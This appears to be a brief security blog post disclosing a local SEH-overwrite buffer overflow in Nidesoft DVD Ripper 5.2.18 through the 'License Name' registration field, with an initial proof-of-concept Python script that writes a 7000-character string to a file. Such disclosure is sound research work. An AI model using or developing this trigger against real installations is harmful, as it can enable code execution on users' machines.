---
layout: post
title: Nidesoft DVD Ripper - 5.2.18 Local Buffer Overflow
date: 2020-03-26 14:45:00
categories: posts
comments: false
en: true
---

# The Bug 

### DVD Ripper version 5.2.18 suffers from a Structured Exception Handling Overwrite when a long string is parsed through the parameter "License Name" within the registration in the bootup.

### Initial PoC:

```term
import struct

buffer = "A" * 7000

f = open ("poc.txt", "w")
f.write(buffer)
f.close()
```
